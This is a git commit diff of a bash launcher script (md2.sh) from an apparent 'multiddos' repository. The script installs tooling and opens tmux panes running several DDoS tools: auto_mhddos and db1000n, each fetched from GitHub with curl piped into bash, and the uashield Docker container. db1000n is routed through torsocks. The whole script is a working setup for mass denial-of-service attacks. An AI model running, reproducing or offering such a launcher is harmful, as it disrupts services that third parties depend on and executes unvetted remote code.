d0ec937f362d1f8fc5c3bf9db6852a6f6ba8ccf6
KarboDuck <53382906+KarboDuck@users.noreply.github.com>
2022-04-09 15:26:19 +0300

    Update and rename test.sh to md2.sh

--- md2.sh
+++ md2.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 # curl -s https://raw.githubusercontent.com/KarboDuck/multiddos/main/test.sh -o md.sh && bash md.sh
 sudo apt-get update -y
-sudo apt-get install -y tmux wget torsocks python3 python3-pip gcc libc-dev libffi-dev libssl-dev python3-dev rustc
+sudo apt-get install -y tmux wget torsocks vnstat fish python3 python3-pip gcc libc-dev libffi-dev libssl-dev python3-dev rustc
 pip install --upgrade pip
 #install docker
 sudo apt install apt-transport-https ca-certificates curl software-properties-common
@@ -23,15 +23,15 @@ if [ ! -f "/usr/local/bin/gotop" ]; then
     sudo dpkg -i gotop_3.0.0_linux_amd64.deb
 fi
 
-tmux new-session -s multiddos -d
+tmux new-session -s multiddos -d 'gotop -asc solarized'
 sleep 0.1
-tmux split-window -h -p 75 'gotop -asc solarized'
+tmux split-window -h -p 75 'curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/bash/auto_bash.sh | bash'
 sleep 0.1
-#tmux split-window -h -p 75 'curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/bash/auto_bash.sh |  bash'
 tmux split-window -v 'docker run -it --rm  ghcr.io/opengs/uashield:master 512 true'
 sleep 0.1
 tmux split-window -v 'curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh | bash && torsocks -i ./db1000n'
 #tmux split-window -v 'docker run --rm -it --pull always ghcr.io/arriven/db1000n'
 tmux select-pane -t 0
-curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/bash/test.sh | bash
+sleep 0.1
+tmux split-window -v 'vnstat -l'
 tmux -2 attach-session -d
